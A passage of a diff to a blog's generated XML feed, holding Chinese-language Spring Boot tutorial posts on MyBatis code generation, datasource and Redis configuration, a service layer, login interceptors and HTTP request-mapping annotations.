class="symbol">&amp;amp;</span>characterEncoding=utf-8<span class="symbol">&amp;amp;</span>useSSL=false<span class="symbol">&amp;amp;</span>serverTimezone=GMT%2B8&quot;</span></span></span><br><span class="line"><span class="tag">                        <span class="attr">userId</span>=<span class="string">&quot;root&quot;</span></span></span><br><span class="line"><span class="tag">                        <span class="attr">password</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;nullCatalogMeansCurrent&quot;</span> <span class="attr">value</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;/<span class="name">jdbcConnection</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!--生成model 类，targetPackage 指定 model 类的包名，targetProject 指定</span></span><br><span class="line"><span class="comment">        生成的 model放在eclipse的哪个工程下面--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">javaModelGenerator</span> <span class="attr">targetPackage</span>=<span class="string">&quot;com.springboot.model&quot;</span></span></span><br><span class="line"><span class="tag">                            <span class="attr">targetProject</span>=<span class="string">&quot;src/main/java&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;enableSubPackages&quot;</span> <span class="attr">value</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;trimStrings&quot;</span> <span class="attr">value</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">javaModelGenerator</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--生成 MyBatis的Mapper.xml文件，targetPackage 指定 mapper.xml文件的包名，targetProject 指定生成的 mapper.xml放在 eclipse的哪个工程下面</span></span><br><span class="line"><span class="comment">        --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">sqlMapGenerator</span> <span class="attr">targetPackage</span>=<span class="string">&quot;com.springboot.mapper&quot;</span></span></span><br><span class="line"><span class="tag">                         <span class="attr">targetProject</span>=<span class="string">&quot;src/main/java&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;enableSubPackages&quot;</span> <span class="attr">value</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">sqlMapGenerator</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--生成 MyBatis的 Mapper接口类文件,targetPackage 指定 Mapper 接口类的包名，targetProject 指定生成的 Mapper 接口放在eclipse 的哪个工程下面</span></span><br><span class="line"><span class="comment">        --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">javaClientGenerator</span> <span class="attr">type</span>=<span class="string">&quot;XMLMAPPER&quot;</span></span></span><br><span class="line"><span class="tag">                             <span class="attr">targetPackage</span>=<span class="string">&quot;com.springboot.mapper&quot;</span></span></span><br><span class="line"><span class="tag">                             <span class="attr">targetProject</span>=<span class="string">&quot;src/main/java&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;enableSubPackages&quot;</span> <span class="attr">value</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">javaClientGenerator</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--数据库表名及对应的Java模型类名，数据库有多少张表就配置几个table--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">table</span> <span class="attr">tableName</span>=<span class="string">&quot;t_student&quot;</span> <span class="attr">domainObjectName</span>=<span class="string">&quot;Student&quot;</span></span></span><br><span class="line"><span class="tag">               <span class="attr">enableCountByExample</span>=<span class="string">&quot;false&quot;</span></span></span><br><span class="line"><span class="tag">               <span class="attr">enableUpdateByExample</span>=<span class="string">&quot;false&quot;</span></span></span><br><span class="line"><span class="tag">               <span class="attr">enableDeleteByExample</span>=<span class="string">&quot;false&quot;</span></span></span><br><span class="line"><span class="tag">               <span class="attr">enableSelectByExample</span>=<span class="string">&quot;false&quot;</span></span></span><br><span class="line"><span class="tag">               <span class="attr">selectByExampleQueryId</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">context</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">generatorConfiguration</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><strong>2.在pom.xml文件中导入MyBatis-generator插件</strong></p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"> <span class="comment">&lt;!--MyBatis整合SpringBoot框架的起步依赖--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis.spring.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.1.4<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis.generator<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-generator-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.3.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">    	<span class="comment">&lt;!--配置文件的位置--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">configurationFile</span>&gt;</span>GeneratorMapper.xml<span class="tag">&lt;/<span class="name">configurationFile</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">verbose</span>&gt;</span>true<span class="tag">&lt;/<span class="name">verbose</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">overwrite</span>&gt;</span>true<span class="tag">&lt;/<span class="name">overwrite</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://s3.ax1x.com/2021/03/15/6BsMTg.png" alt="6BsMTg.png"></p>
+<p>然后查看生成的StudentMapper.xml</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"> <span class="tag">&lt;<span class="name">resultMap</span> <span class="attr">id</span>=<span class="string">&quot;BaseResultMap&quot;</span> <span class="attr">type</span>=<span class="string">&quot;com.springboot.model.Student&quot;</span>&gt;</span></span><br><span class="line">     <span class="comment">&lt;!--id标签只能修改主键字段--&gt;</span></span><br><span class="line">     <span class="comment">&lt;!--result除了主键以外的字段--&gt;</span></span><br><span class="line">     <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">	column数据库中的字段名称	</span></span><br><span class="line"><span class="comment">		property映射对象的属性名称</span></span><br><span class="line"><span class="comment">	jdbcType列中数据库中字段的类型（可以省略不写）</span></span><br><span class="line"><span class="comment">	--&gt;</span></span><br><span class="line">     <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">	resultMap作用</span></span><br><span class="line"><span class="comment">	1.当数据库中字段名称与实体对象的属性名不一致时，可以进行转换</span></span><br><span class="line"><span class="comment">	2.当前查询的结果没有对象一个表的时候，可以自定义一个结果集		</span></span><br><span class="line"><span class="comment">	--&gt;</span></span><br><span class="line">     <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">	数据库字段名称		实体对象属性名称</span></span><br><span class="line"><span class="comment">	user_name		userName</span></span><br><span class="line"><span class="comment">	product_type	productType</span></span><br><span class="line"><span class="comment">	--&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">id</span> <span class="attr">column</span>=<span class="string">&quot;id&quot;</span> <span class="attr">jdbcType</span>=<span class="string">&quot;INTEGER&quot;</span> <span class="attr">property</span>=<span class="string">&quot;id&quot;</span> /&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">&quot;name&quot;</span> <span class="attr">jdbcType</span>=<span class="string">&quot;VARCHAR&quot;</span> <span class="attr">property</span>=<span class="string">&quot;name&quot;</span> /&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">&quot;age&quot;</span> <span class="attr">jdbcType</span>=<span class="string">&quot;INTEGER&quot;</span> <span class="attr">property</span>=<span class="string">&quot;age&quot;</span> /&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">resultMap</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--抽取公共部分，方便下面include引用--&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">sql</span> <span class="attr">id</span>=<span class="string">&quot;Base_Column_List&quot;</span>&gt;</span></span><br><span class="line">   id, name, age</span><br><span class="line"> <span class="tag">&lt;/<span class="name">sql</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><strong>3.指定资源文件夹</strong></p>
+<p>在pom.xml文件中的build下添加，扫描StudentMapper.xml</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--        手动指定文件夹为resources--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">resources</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">resource</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">directory</span>&gt;</span>src/main/java<span class="tag">&lt;/<span class="name">directory</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">includes</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.xml<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">includes</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">resource</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">resources</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><strong>4.配置application.properties文件</strong></p>
+<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="comment">#配置内嵌Tomcat端口号</span></span><br><span class="line"><span class="meta">server.port</span>=<span class="string">9090 </span></span><br><span class="line"><span class="comment">#配置项目上下文根</span></span><br><span class="line"><span class="meta">server.servlet.context-path</span>=<span class="string">/</span></span><br><span class="line"><span class="comment">#配置数据库的连接信息</span></span><br><span class="line"><span class="comment"># 注意这里的驱动类有变化</span></span><br><span class="line"><span class="meta">spring.datasource.driver-class-name</span>=<span class="string">com.mysql.cj.jdbc.Driver</span></span><br><span class="line"><span class="meta">spring.datasource.url</span>=<span class="string">jdbc:mysql://localhost:3306/springboot_student?useUnicode=true&amp;characterEncoding=utf-8&amp;useSSL=false&amp;serverTimezone=GMT%2B8</span></span><br><span class="line"><span class="meta">spring.datasource.username</span>=<span class="string">root</span></span><br><span class="line"><span class="meta">spring.datasource.password</span>=<span class="string">root</span></span><br></pre></td></tr></table></figure>
+<h2 id="5-2-业务逻辑"><a href="#5-2-业务逻辑" class="headerlink" title="5.2 业务逻辑"></a>5.2 业务逻辑</h2><p>Controller—&gt;Service—&gt;ServiceImpl</p>
+<p>先Controller</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StudentController</span></span>&#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> StudentService studentService;</span><br><span class="line">	</span><br><span class="line">	<span class="meta">@RequestMapping(value = &quot;/student&quot;)</span></span><br><span class="line">	<span class="keyword">public</span> <span class="meta">@ResponseBody</span> <span class="function">Student <span class="title">queryStudentById</span><span class="params">(Integer id)</span></span>&#123;</span><br><span class="line">        <span class="comment">//调用业务层方法</span></span><br><span class="line">        Student student = studentService.queryStudentById(id);</span><br><span class="line">		<span class="keyword">return</span> student;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然后写Service层</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">StudentService</span> </span>&#123;</span><br><span class="line">    <span class="comment">//根据学生id查询详情</span></span><br><span class="line">    <span class="function">Student <span class="title">queryStudentById</span><span class="params">(Integer id)</span></span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>再写ServiceImpl类</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StudentServiceImpl</span> <span class="keyword">implements</span> <span class="title">StudentService</span></span>&#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> StudentMapper studentMapper;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Student <span class="title">queryStudentById</span><span class="params">(Integer id)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> studentMapper.selectByPrimaryKey(id);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在入口类上写上@MapperScan(basePackages = “”)注解</p>
+<h2 id="5-3-MyBatis映射文件方法有两种"><a href="#5-3-MyBatis映射文件方法有两种" class="headerlink" title="5.3 MyBatis映射文件方法有两种"></a>5.3 MyBatis映射文件方法有两种</h2><ul>
+<li>第一种</li>
+</ul>
+<p>当接口类和xml文件在一块时，在pom.xml中的build标签中添加</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--手动指定文件夹为resources--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">resources</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">resource</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">directory</span>&gt;</span>src/main/java<span class="tag">&lt;/<span class="name">directory</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">includes</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.xml<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">includes</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">resource</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">resources</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>第二种</li>
+</ul>
+<p>在resource文件夹中新建mapper文件夹中，放入StudentMapper.xml，在application.properties中写入以下代码</p>
+<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="comment">#配置内嵌Tomcat端口号</span></span><br><span class="line"><span class="meta">server.port</span>=<span class="string">9090 </span></span><br><span class="line"><span class="comment">#配置项目上下文根</span></span><br><span class="line"><span class="meta">server.servlet.context-path</span>=<span class="string">/</span></span><br><span class="line"><span class="comment">#配置数据库的连接信息</span></span><br><span class="line"><span class="comment"># 注意这里的驱动类有变化</span></span><br><span class="line"><span class="meta">spring.datasource.driver-class-name</span>=<span class="string">com.mysql.cj.jdbc.Driver</span></span><br><span class="line"><span class="meta">spring.datasource.url</span>=<span class="string">jdbc:mysql://localhost:3306/springboot_student?useUnicode=true&amp;characterEncoding=utf-8&amp;useSSL=false&amp;serverTimezone=GMT%2B8</span></span><br><span class="line"><span class="meta">spring.datasource.username</span>=<span class="string">root</span></span><br><span class="line"><span class="meta">spring.datasource.password</span>=<span class="string">root</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#指定MyBatis映射文件路径</span></span><br><span class="line"><span class="meta">mybatis.mapper-locations</span>=<span class="string">classpath:mapper/*.xml</span></span><br></pre></td></tr></table></figure>
+<h1 id="6-集成Redis依赖"><a href="#6-集成Redis依赖" class="headerlink" title="6.集成Redis依赖"></a>6.集成Redis依赖</h1><p><strong>1.在pom.xml中添加以下依赖</strong></p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--SpringBoot集成Redis起步依赖--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-data-redis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><strong>2.配置application.properties</strong></p>
+<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="comment">#设置redis配置信息</span></span><br><span class="line"><span class="meta">spring.redis.host</span>=<span class="string">localhost</span></span><br><span class="line"><span class="meta">spring.redis.port</span>=<span class="string">6379</span></span><br><span class="line"><span class="meta">spring.redis.password</span>=<span class="string">root</span></span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>SpringBoot学习</category>
+      </categories>
+      <tags>
+        <tag>SpringBoot学习</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>SpringBoot学习（一）</title>
     <url>/post/2507049e.html</url>
     <content><![CDATA[<p>　　在学校第一次学习SpringBoot的时候写的，跟着老师给的代码，好不容易运行的起来<span id="more"></span></p>
@@ -2024,144 +2223,6 @@
       </tags>
   </entry>
   <entry>
-    <title>SpringBoot-拦截器</title>
-    <url>/post/e3a97206.html</url>
-    <content><![CDATA[<p>　　SpringBoot学习，主要内容是拦截器，可以实现网站的登录功能<span id="more"></span></p>
-<h1 id="1-实现登录拦截"><a href="#1-实现登录拦截" class="headerlink" title="1.实现登录拦截"></a>1.实现登录拦截</h1><p>　　首先需要编写相应模块的类实现HandlerInterceptor，然后再拦截配置类里面编辑要拦截胡页面。</p>
-<h2 id="1-1-编写类实现HandlerInterceptor类"><a href="#1-1-编写类实现HandlerInterceptor类" class="headerlink" title="1.1 编写类实现HandlerInterceptor类"></a>1.1 编写类实现HandlerInterceptor类</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserInterceptor</span> <span class="keyword">implements</span> <span class="title">HandlerInterceptor</span></span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//编写业务拦截的规则</span></span><br><span class="line">        <span class="comment">//从session中获取用户的信息</span></span><br><span class="line">        User user = (User) request.getSession().getAttribute(<span class="string">&quot;user&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//判断用户是否登录</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">null</span> == user) &#123;</span><br><span class="line">            <span class="comment">//未登录</span></span><br><span class="line">            response.sendRedirect(request.getContextPath() + <span class="string">&quot;/nologin&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">postHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">afterCompletion</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>　　实现HanderInterceptor，重写preHandle、postHandle、afterCompletion三个方法，先获取session的用户信息，然后判断是否登录。</p>
-<h2 id="1-2-声明拦截配置类"><a href="#1-2-声明拦截配置类" class="headerlink" title="1.2 声明拦截配置类"></a>1.2 声明拦截配置类</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="comment">//定义此类为配置文件</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InterceptorConfig</span> <span class="keyword">implements</span> <span class="title">WebMvcConfigurer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addInterceptors</span><span class="params">(InterceptorRegistry registry)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//要拦截user下的所有访问请求，必须用户登录后才能访问</span></span><br><span class="line">        String[] addPathPatterns = &#123;</span><br><span class="line">            <span class="string">&quot;/user/**&quot;</span></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//排除路径，排除的路径说明不需要用户登录也可以访问</span></span><br><span class="line">        String[] excludePathPatterns = &#123;</span><br><span class="line">            <span class="string">&quot;/user/out&quot;</span>,<span class="string">&quot;/user/error&quot;</span>,<span class="string">&quot;/user/login&quot;</span></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        registry.addInterceptor(<span class="keyword">new</span> UserInterceptor()).addPathPatterns(addPathPatterns).excludePathPatterns(excludePathPatterns);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>　　需要实现WebMvcConfigurer，重写addInterceptors方法，在里面配置需要拦截的请求和排除的请求。</p>
-<h2 id="1-3-编写Controller类进行验证"><a href="#1-3-编写Controller类进行验证" class="headerlink" title="1.3 编写Controller类进行验证"></a>1.3 编写Controller类进行验证</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@RequestMapping(value = &quot;/user&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/login&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="meta">@ResponseBody</span> <span class="function">Object <span class="title">login</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span></span>&#123;</span><br><span class="line">        <span class="comment">//将user用户存入session</span></span><br><span class="line">        User user = <span class="keyword">new</span> User();</span><br><span class="line">        user.setId(<span class="number">1001</span>);</span><br><span class="line">        user.setUsername(<span class="string">&quot;zhangsan&quot;</span>);</span><br><span class="line">        request.getSession().setAttribute(<span class="string">&quot;user&quot;</span>,user);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;login SUCCESS&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//登录成功才能看到的信息</span></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/center&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="meta">@ResponseBody</span> <span class="function">Object <span class="title">center</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;See Center Message&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//不用登录就能看到的信息</span></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/out&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="meta">@ResponseBody</span> <span class="function">Object <span class="title">out</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;See Out Message&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//如果用户未登录访问了需要登录才可访问的请求，才会出错</span></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/error&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="meta">@ResponseBody</span> <span class="function">Object <span class="title">error</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;error&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h1 id="2-在SpringBoot框架下使用Servlet"><a href="#2-在SpringBoot框架下使用Servlet" class="headerlink" title="2.在SpringBoot框架下使用Servlet"></a>2.在SpringBoot框架下使用Servlet</h1><ul>
-<li><p>第一种方式</p>
-<p>在主程序入口处加上@ServletComponentScan注解，然后正常使用@WebServlet注解</p>
-</li>
-<li><p>第二种方式</p>
-<p>使用@Configuration注解定义一个配置类</p>
-</li>
-</ul>
-]]></content>
-      <categories>
-        <category>SpringBoot学习</category>
-      </categories>
-      <tags>
-        <tag>SpringBoot学习</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>SpringBoot-请求方式注解</title>
-    <url>/post/6cd03ce5.html</url>
-    <content><![CDATA[<p>　　主要是在开发过程中，如何区别各种请求类型，还有RESTful风格的了解<span id="more"></span></p>
-<h1 id="1-注解"><a href="#1-注解" class="headerlink" title="1.注解"></a>1.注解</h1><h2 id="1-1-RestController"><a href="#1-1-RestController" class="headerlink" title="1.1 @RestController"></a>1.1 @RestController</h2><p>　　相当于控制层类加上@Controller+方法上加@ResponseBody ，意味着当前控制层类中所有方法返还的都是JSON对象</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//@Controller</span></span><br><span class="line"><span class="comment">//相当于控制层类加上@Controller+方法上加@ResponseBody</span></span><br><span class="line"><span class="comment">//意味着当前控制层类中所有方法返还的都是JSON对象</span></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StudentController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/student&quot;)</span></span><br><span class="line"><span class="comment">//    @ResponseBody</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">student</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Student student = <span class="keyword">new</span> Student();</span><br><span class="line">        student.setName(<span class="string">&quot;zhangsan&quot;</span>);</span><br><span class="line">        student.setId(<span class="number">1011</span>);</span><br><span class="line">        <span class="keyword">return</span> student;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="1-2-GetMapping查"><a href="#1-2-GetMapping查" class="headerlink" title="1.2 @GetMapping查"></a>1.2 @GetMapping查</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//    查询数据使用</span></span><br><span class="line"><span class="meta">@GetMapping(value = &quot;/queryStudentById2&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">queryStudentById2</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Only GET Method&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="1-3-PostMapping增"><a href="#1-3-PostMapping增" class="headerlink" title="1.3 @PostMapping增"></a>1.3 @PostMapping增</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@PostMapping(value = &quot;/insert&quot;)</span></span><br><span class="line"><span class="comment">//    新增数据使用</span></span><br><span class="line"><span class="comment">//    该注解通常在新增数据的时候使用</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">insert</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Insert success&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="1-4-DeleteMapping删"><a href="#1-4-DeleteMapping删" class="headerlink" title="1.4 @DeleteMapping删"></a>1.4 @DeleteMapping删</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@DeleteMapping(value = &quot;/delete&quot;)</span></span><br><span class="line"><span class="comment">//    删除数据时候使用</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">delete</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;delete Student&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
